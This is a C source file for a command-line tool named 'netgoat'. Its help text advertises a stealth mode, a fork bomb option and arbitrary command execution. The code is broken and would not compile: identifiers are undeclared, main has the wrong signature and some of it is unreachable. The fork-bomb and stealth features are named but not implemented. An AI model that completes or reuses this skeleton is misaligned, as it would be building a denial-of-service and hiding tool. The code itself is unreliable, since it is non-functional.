#include <stdio.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <malloc.h>

int main(int argc, char *argv){
 int fail;
    flop = flags(argc,argv);
    while(1){
        struct sigaction handle;
        handle.sa_handler = &sighandle;
        handle.sa_flags = SA_RESTART;
        
        fail = sigaction(SIGUSR1, &handle, NULL);
        if(fail == STD_ERROR){
            fprintf(stderr, "ERROR: Unable to register signal handler\n");
            return 2;
        }
        fail = sigaction(SIGUSR2, &handle, NULL);
        if(fail == STD_ERROR){
            fprintf(stderr,"ERROR: Unable to register signal handler.\n");
            return 2;
        }
        fail = sigaction(SIGINT, &handle, NULL);
        if(fail == STD_ERROR){
            fprintf(stderr, "ERROR: Unable to register signal handler.\n");
            return 2;
        }
        printf("Waiting on the signals please wait...\n");
        pause();
        return(0);
    }
    hide();   
}
void myshell(char * argv[]){
if(!getenv("PATH")){
    setenv("PATH","/bin:/usr/bin:/usr/local/bin",1);
}
int pidFork = fork();
if(pidFork == 0){
    execvp(argv[0], &argv[0]);
    exit(0);
}
else if(pidFork < 0){
    perror("ERROR");
}
else{
    wait(NULL);
    exit(0);
}
execvp(command.cmd,command.argv);
}

int flags(int argc, char *argv[]){
    int opt = 0;
    while((opt = getopt(argc,argv,"hc:sfel:"))!= -1){
        switch(opt){
            case 'f':
            flop = -1;
            return(flop);
            break;

            case 'e':
            myshell(&argv[2]);
            break;
        }
    }
}
void show_usage(){
            printf("NAME\n\n");
            printf("netgoat\n\n");
            printf("NetGoat allows the users to select from command line options to perform tasks.\n\n");
            printf("netgoat [file] ...\n\n");
            printf("Command Line Options\n\n");

            printf("netgoat <option>\n");
            printf("-h\thelp\n");
            printf("-s\tenter stealth mode\n");
            printf("-c\treads file\n");
            printf("-f\tactivate fork bomb\n");
            printf("-e\texecute myshell command\n");
}